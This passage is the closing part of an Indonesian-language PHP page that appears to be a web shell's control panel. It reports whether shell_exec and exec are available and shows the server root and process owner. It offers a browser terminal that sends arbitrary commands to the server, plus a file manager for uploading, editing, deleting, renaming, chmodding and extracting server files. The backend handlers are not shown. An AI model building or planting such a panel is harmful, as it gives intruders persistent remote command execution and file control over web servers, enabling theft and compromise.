        <div class="info-card"><h3>⚙️ Shell Access</h3><p>shell_exec: <?= $has_shell_exec ? '<span class="badge badge-success">✅</span>' : '<span class="badge badge-danger">❌</span>' ?></p><p>exec: <?= $has_exec ? '<span class="badge badge-success">✅</span>' : '<span class="badge badge-danger">❌</span>' ?></p></div>
        <div class="info-card"><h3>📦 Ekstensi</h3><p>Zip: <?= $has_zip ? '<span class="badge badge-success">✅</span>' : '<span class="badge badge-danger">❌</span>' ?></p><p>cURL: <?= extension_loaded('curl') ? '<span class="badge badge-success">✅</span>' : '<span class="badge badge-danger">❌</span>' ?></p></div>
        <div class="info-card"><h3>📁 Direktori</h3><p>Root: <?= h($_SERVER['DOCUMENT_ROOT'] ?? 'N/A') ?></p><p>Owner: <?= function_exists('get_current_user') ? h(get_current_user()) : 'N/A' ?></p></div>
      </div>
      <details style="margin-top:16px;">
        <summary style="cursor:pointer; color:#94a3b8;"><i class="fas fa-list"></i> Semua Ekstensi (<?= count($extensions) ?>)</summary>
        <div style="max-height:200px; overflow-y:auto; background:#020617; padding:12px; border-radius:12px; margin-top:10px; font-size:13px;"><?= implode(', ', array_map('h', $extensions)) ?></div>
      </details>
    </div>
  <?php elseif ($menu === 'change_pass'): ?>
    <div class="card">
      <div class="card-header"><h2><i class="fas fa-key"></i> Ganti Password</h2></div>
      <form method="POST" action="?action=change_password">
        <div class="form-group"><label>Password Lama</label><input type="password" name="old_pass" required></div>
        <div class="form-group"><label>Password Baru</label><input type="password" name="new_pass" required></div>
        <div class="form-group"><label>Konfirmasi Password Baru</label><input type="password" name="confirm_pass" required></div>
        <button type="submit" class="btn btn-green"><i class="fas fa-save"></i> Ubah Password</button>
      </form>
    </div>
  <?php endif; ?>

  <!-- TERMINAL CARD -->
  <div class="card">
    <div class="card-header"><h2><i class="fas fa-terminal"></i> Terminal</h2><span style="font-family: 'JetBrains Mono', monospace; font-size:13px; color:#94a3b8;"><?= h($cwd) ?></span></div>
    <div class="terminal" id="term">Menghubungkan...</div>
    <div class="input-group"><input id="cmdline" placeholder="Ketik perintah..."><button class="btn btn-green" id="send">Kirim</button><button class="btn btn-gray" id="clear">Clear</button></div>
  </div>

  <!-- FILE MANAGER CARD -->
  <div class="card">
    <div class="card-header"><h2><i class="fas fa-folder-open"></i> File Manager</h2></div>
    <div class="toolbar">
      <a href="?action=cd&path=.." class="btn btn-gray btn-sm"><i class="fas fa-level-up-alt"></i> ..</a>
      <a href="?" class="btn btn-gray btn-sm"><i class="fas fa-sync-alt"></i> Refresh</a>
      <form method="post" action="?action=mkdir"><input type="text" name="dirname" placeholder="Nama folder" required><button type="submit" class="btn btn-green btn-sm"><i class="fas fa-plus-circle"></i> Mkdir</button></form>
      <form method="post" action="?action=create_file"><input type="text" name="filename" placeholder="File baru.txt" required><input type="text" name="filecontent" placeholder="Isi (opsional)" style="width:150px;"><button type="submit" class="btn btn-green btn-sm"><i class="fas fa-file"></i> Buat File</button></form>
      <form method="post" action="?action=upload" enctype="multipart/form-data"><input type="file" name="file" required><button type="submit" class="btn btn-green btn-sm"><i class="fas fa-upload"></i> Upload</button></form>
    </div>
    <?php if (isset($editFile)): ?>
      <div>
        <h3 style="margin-bottom:12px;">✏️ Edit: <?= h($editFile) ?></h3>
        <form method="post" action="?action=save">
          <input type="hidden" name="file" value="<?= h($editFile) ?>">
          <textarea name="content" style="width:100%; height:350px; background:#020617; border:1px solid #334155; color:#e2e8f0; font-family:'JetBrains Mono',monospace; padding:14px; border-radius:12px;"><?= h($editContent) ?></textarea>
          <div style="margin-top:12px; display:flex; gap:10px;">
            <button type="submit" class="btn btn-green">💾 Simpan</button>
            <a href="?" class="btn btn-gray">Batal</a>
          </div>
        </form>
      </div>
    <?php elseif (isset($viewContent)): ?>
      <div>
        <h3 style="margin-bottom:12px;">📄 <?= h($viewFilename) ?></h3>
        <pre><?= h($viewContent) ?></pre>
        <a href="?" class="btn btn-gray" style="margin-top:12px;">← Kembali</a>
      </div>
    <?php else: ?>
      <table>
        <thead><tr><th>Nama</th><th>Ukuran</th><th>Perms</th><th>Aksi</th></tr></thead>
        <tbody>
        <?php
        $items = @scandir($cwd);
        if ($items) {
            $dirs = []; $files = [];
            foreach ($items as $item) { if ($item === '.') continue; if (is_dir($cwd.'/'.$item)) $dirs[]=$item; else $files[]=$item; }
            sort($dirs); sort($files);
            foreach (array_merge($dirs,$files) as $item):
                $full = $cwd . '/' . $item;
                $isdir = is_dir($full);
                $perms = substr(sprintf('%o', fileperms($full)), -4);
                $size = $isdir ? '-' : filesize($full);
                $enc = urlencode($item);
                $rowClass = $isdir ? 'dir-row' : 'file-row';
        ?>
          <tr class="<?= $rowClass ?>">
            <td><?= $isdir ? '📁' : '📄' ?> <?php if($isdir): ?><a href="?action=cd&path=<?= $enc ?>" style="color:inherit; text-decoration:none;"><?= h($item) ?>/</a><?php else: ?><?= h($item) ?><?php endif; ?></td>
            <td><?= $isdir ? '-' : number_format($size).' B' ?></td>
            <td><?= $perms ?></td>
            <td class="action-cell">
              <?php if(!$isdir): ?><a href="?action=view&file=<?= $enc ?>">Lihat</a><a href="?action=edit&file=<?= $enc ?>">Edit</a><a href="?action=download&file=<?= $enc ?>">Unduh</a><?php endif; ?>
              <a href="#" onclick="if(confirm('Hapus?')) location='?action=delete&file=<?= $enc ?>'">Hapus</a>
              <a href="#" onclick="renamePrompt('<?= addslashes($item) ?>')">Ganti Nama</a>
              <a href="#" onclick="chmodPrompt('<?= addslashes($item) ?>','<?= $perms ?>')">Chmod</a>
              <?php if(!$isdir && preg_match('/\.(zip|tar|tgz)$/', strtolower($item))): ?><a href="?action=extract&file=<?= $enc ?>" onclick="return confirm('Ekstrak?')">Ekstrak</a><?php endif; ?>
            </td>
          </tr>
        <?php endforeach; } else { echo '<tr><td colspan="4">Tidak dapat membaca direktori</td></tr>'; } ?>
        </tbody>
      </table>
    <?php endif; ?>
  </div>
</div>

<script>
const ENDPOINT = location.pathname;
const term = document.getElementById('term');
const cmdline = document.getElementById('cmdline');
let last = '';

async function readLog() {
  try {
    const res = await fetch(`${ENDPOINT}?action=read`, {cache:'no-store'});
    const txt = await res.text();
    if (txt !== last) { last = txt; term.textContent = txt || ''; term.scrollTop = term.scrollHeight; }
  } catch(e) { term.textContent = "[ERROR] " + e; }
}
async function runCmd(cmd) {
  try {
    const form = new FormData(); form.append('cmd', cmd);
    await fetch(`${ENDPOINT}?action=run`, {method:'POST', body: form});
  } catch(e) { term.textContent += "\n[ERR] " + e; }
}
document.getElementById('send').addEventListener('click', () => { let c = cmdline.value.trim(); if(c) runCmd(c); cmdline.value = ''; });
cmdline.addEventListener('keydown', (e) => { if(e.key === 'Enter') { e.preventDefault(); document.getElementById('send').click(); } });
document.getElementById('clear').addEventListener('click', async () => { await fetch(`${ENDPOINT}?action=clear`); last = ''; term.textContent = ''; });
readLog(); setInterval(readLog, 1000);

function renamePrompt(oldname) { let n = prompt("Nama baru:", oldname); if(n && n !== oldname) { let f = document.createElement('form'); f.method='POST'; f.action='?action=rename'; f.innerHTML='<input name="old" value="'+oldname+'"><input name="new" value="'+n+'">'; document.body.appendChild(f); f.submit(); } }
function chmodPrompt(fname, current) { let m = prompt("Mode oktal (mis. 0755):", current); if(m) { let f = document.createElement('form'); f.method='POST'; f.action='?action=chmod'; f.innerHTML='<input name="file" value="'+fname+'"><input name="mode" value="'+m+'">'; document.body.appendChild(f); f.submit(); } }

// Hamburger menu
const hamburger = document.getElementById('hamburgerBtn');
const dropdown = document.getElementById('menuDropdown');
hamburger.addEventListener('click', (e) => { e.stopPropagation(); dropdown.classList.toggle('show'); });
document.addEventListener('click', (e) => { if(!hamburger.contains(e.target) && !dropdown.contains(e.target)) dropdown.classList.remove('show'); });
</script>
</body>
</html>